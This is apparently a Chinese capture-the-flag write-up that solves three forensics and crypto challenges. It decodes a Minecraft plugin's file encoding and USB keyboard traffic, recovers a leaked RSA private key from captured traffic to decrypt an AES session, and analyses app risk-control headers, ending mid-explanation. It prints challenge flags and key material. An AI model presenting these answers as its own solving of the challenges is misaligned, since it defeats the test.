打开发现给了一个minecraft的服务端。启动游戏和服务端，连接，进入发现给了提示"input /decodeblocks to get flag",输入 `/decodeblocks` 发现该命令保存了一个文件“cyber_keyboard”，直接打开发现经过了编码，猜测是base64。具体用jadx打开服务端的`plugins/file_encoder.jar`分析。找到方法`appendBytesToFile`，阅读代码发现写入文件时，先把文件加了20位并%256，然后异或了24位。编写脚本解码文件。

```python
import base64

def decrypt_file(input_file, output_file):
    with open(input_file, 'r') as file:
        base64_encoded = file.read()
    byte_array = base64.b64decode(base64_encoded)
    xor_value = 24
    decrypted_bytes = bytearray(byte ^ xor_value for byte in byte_array)
    decrypted_bytes = bytearray((byte - 20) % 256 for byte in decrypted_bytes)
    with open(output_file, 'wb') as file:
        file.write(decrypted_bytes)
    
input_file = 'cyber_keyboard'
output_file = 'decode'
decrypt_file(input_file, output_file)

```

运行得到文件后，用010 editor打开分析，发现文件头是zip。修改后缀打开发现有密码，注释写“密码存在吗？”，大胆猜测是伪加密或者爆破。先试一下伪加密，把01改成00，成功打开。

解压得到一个流量包，结合文件名知道这是一个usb键盘流量分析题。使用脚本“UsbKeyboardDataHacker”发现无法直接爆破，那么只好手动操作。

先把usb.capdata提取出来，`tshark -r cyber_keyboard.pcapng -T fields -e usb.capdata`,010400是固定开头，后两位对应hid码。结合注释的“HID规范1.5”，找到规范文件，第一个hid码是5d，翻到91页发现是小键盘数字5：

![image-1730940370420](./assets/image-1730940370420.png)

逐一对应查找得到对照表：

```plain
59：1,5a；2,5b；3,5c：4,5d：5,5e：6,5f：7,60：8,61：9,62：0,bc：a,bd:b,be:c,bf:d,c0:e,c1:f,57:+
```

得到一组看起来没有顺序的数。不过后面的看得出来是unicode的编码。分成两段分析。

![image-1730940371013](./assets/image-1730940371013.png)

重新检查流量表，发现每隔5个数就有一个0100的特殊包，分组。后半段是unicode编码，那么前半段应该也是某种编码。五位为一组，又是小键盘数字输入，应该是一种windows特殊的ascii码输入方法，即按下alt并输入ascii码得到某个字符。编写py脚本

```python
decimal_values = [
    55252,54217,55252,54217,55252,54217,50161,55031,50877,46536,47821,53427,55252,54217,47821,53427,50877,46536,55252,54217,55252,54217,47531,54781,47016,54990,46031,53445,50161,55031,47821,53427,47821,53427,47531,54781,47821,53427,47821,53427,50161,55031,47531,54781,52932,50167,47531,54781,55252,54217,47531,54781,47531,54781,47821,53427,47531,54781,47821,53427,47821,53427,52932,50167,54225,51654,47016,54990,47821,53427,47016,54990,47821,53427,47531,54781,47531,54781,47821,53427,47821,53427,47016,54990,52932,50167,54225,51654,47016,54990,47821,53427,55252,54217,47821,53427,48820,53941,47821,53427,47016,54990,47821,53427,52932,50167
]

string = ''
for value in decimal_values:
    character = int(value).to_bytes(2, byteorder='big').decode('gbk', errors='ignore')
    string += character

print(string)
```

运行得到`自由自由自由民主平等和谐自由和谐平等自由自由公正法治诚信民主和谐和谐公正和谐和谐民主公正文明公正自由公正公正和谐公正和谐和谐文明友善法治和谐法治和谐公正公正和谐和  
谐法治文明友善法治和谐自由和谐敬业和谐法治和谐文明`

对于后半段的unicode，也编写脚本

```python
hex_list = [
    "6587", "660E", "53CB", "5584", "6CD5", "6CBB", "516C", "6B63","6C11", "4E3B", "548C", "8C10", "6587", "660E", "516C", "6B63","548C", "8C10", "548C", "8C10", "6CD5", "6CBB", "6587", "660E","53CB", "5584", "6CD5", "6CBB", "516C", "6B63", "516C", "6B63","548C", "8C10", "5BCC", "5F3A", "516C", "6B63", "516C", "6B63","548C", "8C10", "6CD5", "6CBB", "548C", "8C10", "516C", "6B63","548C", "8C10", "548C", "8C10", "548C", "8C10", "81EA", "7531","516C", "6B63", "6C11", "4E3B", "516C", "6B63", "6587", "660E", "548C", "8C10", "5E73", "7B49", "548C", "8C10", "6587", "660E","548C", "8C10", "7231", "56FD", "6CD5","6CBB", "53CB", "5584","6CD5", "6CBB"
]

def hex_to_unicode(hex_list):
    unicode_string = ''.join([chr(int(hex_str, 16)) for hex_str in hex_list])
    return unicode_string

result = hex_to_unicode(hex_list)
print(result)
```

运行得到`文明友善法治公正民主和谐文明公正和谐和谐法治文明友善法治公正公正和谐富强公正公正和谐法治和谐公正和谐和谐和谐自由公正民主公正文明和谐平等和谐文明和谐爱国法治友善法治`

两段拼接，使用社会主义核心价值观解码得到flag

`DASCTF{3c1bdf63-76c7-4972-a2c7-f0f7634ab528}`

## 题目：<font style="color:rgb(33, 37, 41);">monitor</font>
解题步骤

使用逆向分析工具分析客户端程序，可以得知监控程序先接受服务端发来的RSA密钥，然后加密本地生成的AES会话密钥发往服务端，然后双方使用该会话密钥进行加密通信。

漏洞在于在传输RSA密钥时，一并传输了私钥，导致密钥泄露

```plain
public class RsaKeyMessage : IAppMessage
{
    public required byte[] RsaPublicKeyBytes { get; set; }
    public required byte[] RsaPrivateKeyBytes { get; set; }
}
```

首先我们使用tshark提取出tcp流中所有的数据

```bash
tshark -nlr monitor.pcapng -qz follow,tcp,raw,5 -Y 'tcp.dstport==12346' | tail -n +7 | sed 's/^\s\+//g' | xxd -r -p > tcp_stream_5.txt
```

然后使用对应的RSA私钥解密会话秘钥交换消息

```plain
using System;
using System.Security.Cryptography;
using System.Text;
class Program
{
    static void Main() {
        var rsa = RSA.Create();
        rsa.ImportRSAPrivateKey(Convert.FromBase64String("MIIEpAIBAAKCAQEAxdeHjC8YvbE3rEoeluSJ5NP5obNGE1l86jWALgnLT9K8zi2YGvehzhrjloCnAOO9vGFmvK19ThiKS2lpwHFHmBhWgVputEPM7y8zr5zV+Ia9v2frsa2tFl1ODjW3KgljNXRw4UKDdHq/2t5QpKU7+sTiveXMZiOMFZc/7tq60DM+g2WEdXKBM7+lEkPh/wPZIcBL7T77iWyxVLdsrlvMoch8wiQ4ueenK4uF1f8TfFusSrYLI9BHGJpOQ+BjsBwPebM2vaVM8q+Zw+57M+eHKSy9NqLAwGtSGlydRI6dp2/UxilhXZoPfAFRiowLEJw5q8VvekiQEgJinEn3fmzxHQIDAQABAoIBACKzbhP5gsZq2g//JCRlS4Z2Y7eoASeNr6pI3gW1NBL5LKKhPqekPZ4v+zE/uYsfZv0uvF1ltK/JACDACYt2kw8rXajsmrRFnCFrzw4DXUhtIcT7zkxo4Q4mKXW2mDzoTp1mohHwn6wDh7k0+0IVtVKDzB1wvAxCOeTjlZQoi1HPC5Nt2yaoqRAIggM5LKBa2bDSAt5OPnMjP+GJS1EUlV/4PZRREUiIfMRZd+srC3DHtmlUnPF2Z8WvYbSFmY5dUpMSFqLfq/YZ07FCGayUflL4lzUw2r/JQWgR4gFrCkmS4/fdjNl5qw7OuWCAR/C6NpBDWJwTt017XqJuEsZ3UyUCgYEA/+WsJz1e7SomQaSQ/jPMpK/8tahTg1/TpnXRsFZidOPXOtg8IEdOuVscw2FTI15QC295qOZcN/X/7aGyvslvbp7lwBpAQA9opUm54UpDtXipqW77FPwEFSFKTEwWktrX6OCkUycgX+9fMa+V+fQ8kR220AdxYUV2m3DEb9lJD78CgYEAxeviVDuIWVbSHEezeOIkyT3E11B/fCPyovBU0xLTfrP+/HYyWrvT+9koT9ZZ4TMy9DEcTtzszglM3gTUfk6XZ+ZvcZVsmo5MJgy6YcaVFAA4YLrCSR3dLcFBTjPL8SE9ZuFG3Db/kH5c2+FtYfPnl2Ve7uw65uILXQhztXdCtiMCgYEAoPnPKUQfEhygwkyO9YqKYtNeqrwABTXkA+Q8C6zb9OJbQ+ZBNKEG8e1SE8qGrUooGnl+0/RN8NosrEU7F2/KTJFiwE0DPAk1cD0H1KSOIXuNZ0usYVAEFXLCtWpsDOfkSNgAJ1sGr7L6dFwbgYjWDQffN9Bmz6UN7syqlh3fKysCgYBHMwxAcQoj2W/MbJ7Lpc7F9kqRiovSBLyMkRhythsPQYFBIOQMb/VabExsLBg5Q0nZPrGITUGC/SWB2Qr4RR2Caws8ORzQnNAYAAwskFugzlN5uLWbx/qBMzxi/Y8oN2T3VaNAJSjauhp9nyLSUgPGGtmD6cdmt3qPBTNa3IRLMQKBgQCMvXMuGZjedrf7tat9gMDJgYnZey8e7xSuC9H6K4Ls5ammtmyBdrmWhyZiB9d/+88C/Wr3LjqfGyeiBbJoVMqO0tl4INH1FXdL1bItL2Qw5A9r6fqx1E3Cya84hNRNECa/+TVHYjRqc6zt308Q9/cq4ccuQlzOXLjn5jD+DvRQWg=="), out _);
        var keymsg = rsa.Decrypt(Convert.FromBase64String("ltkiWLFdrLFVG+2u42sncVSmzADkbEdVnBwUO64ZJ6nxF3ekj882Edq1/GUn6IC06+7chYsD+8bFP8ABrEA8x8u6Ha1+CNwoKG5HheMRU2pZoSw76y81GaEYa5UBfejiFw1nZ7sQFm1+94kKpRAenTKT0aNFQScD8AFNxeA6a0cimOznM9nK3DtDtqZlZJjzkMNln3DTa4PFQV7wILZ5eK1nAL1qPXFrGiYu4HCkwOkA0jsGlDzOSIihWgdkg1SAJPEtoqr+0K/dwZdoAp6jhrwU6wqROQlBJHa3rdmOD1oh861VquNMMbMl8hldgiE4mNQTvJmgSYEZLRLhUsH+RA=="), RSAEncryptionPadding.Pkcs1);
        Console.WriteLine(Encoding.UTF8.GetString(keymsg));
    }
}

```

得到AES密钥

```plain
{"Type":7,"Message":{"AesKeyBytes":"scDnUZYwddqbeRU3jJCPDUe03mmrXMAb4baN3F1aBhM=","AesIvBytes":"MDSgSR9U/5+bvXMkwkZ14w=="}}
```

根据客户端逻辑，写根据流量解压缩、解密图片信息并保存为png文件的代码

```plain
using System;
using System.Security.Cryptography;
using System.IO;
using System.Text.Json;
using System.IO.Compression;
using System.Text;

var aes = Aes.Create();
aes.IV = Convert.FromBase64String("MDSgSR9U/5+bvXMkwkZ14w==");
aes.Key = Convert.FromBase64String("scDnUZYwddqbeRU3jJCPDUe03mmrXMAb4baN3F1aBhM=");

using StreamReader sr = new StreamReader("./tcp_stream_5.txt");
for(int i = 0; i<4; i++){
    sr.ReadLine();
}

string line;
int num = 1;
while((line = sr.ReadLine())!=null){
    var jsonData = JsonSerializer.Deserialize<dynamic>(line);
    var encryptedMessage = Convert.FromBase64String(jsonData.GetProperty("Message").GetProperty("EncryptedBytes").GetString());
    var decryptedBytes = aes.DecryptCfb(encryptedMessage, aes.IV);
    using var ms = new MemoryStream(decryptedBytes);
    using var gzipStream = new GZipStream(ms, CompressionMode.Decompress);
    using var resultStream = new MemoryStream();
    gzipStream.CopyTo(resultStream);
    var decompressedBytes = resultStream.ToArray();

    var packetString = Encoding.UTF8.GetString(decompressedBytes);
    var packetData = JsonSerializer.Deserialize<dynamic>(packetString);
    if(packetData.GetProperty("Type").GetInt32() != 4) continue;
    var imageData = Convert.FromBase64String(packetData.GetProperty("Message").GetProperty("ImageData").GetString());

    using var file = File.Create($"{num}.png");
    file.Write(imageData);
    num++;
}
```

按顺序查看得到的图片文件，即可得到flag

## 题目：<font style="color:rgb(33, 37, 41);">whyApple</font>
解题步骤

打开包，题目描述比较关键，有两种定位方法，一种通过搜索关键词，可以知道这是某音商业软件的包，而该软件比较著名的安全风控字段就是“六神”（现在不止，即若干带有x-开头的字段）

并且题干提示了”设备注册检查策略“，定位到这一个包

![image-1730940371653](./assets/image-1730940371653.png)

这一个包也是这个软件核心的风控包，可以搜索了解到

可以看到header里面有一段重复的，即小x犯的错，mock时增加了字段，对比上面的正常字段可知需要分析这里

![image-1730940372152](./assets/image-1730940372152.png)

这里比较异常的字段都是给出了明文的十六进制，依据长度可以判断出来是key，依据重复字段判断出来是被修改的，尝试几次发现是密文：

根据长度猜测是AES，解得到一个20位的key

![image-1730940372701](./assets/image-1730940372701.png)

由于key长度不符合常见加密，猜测得到：

![image-1730940373213](./assets/image-1730940373213.png)

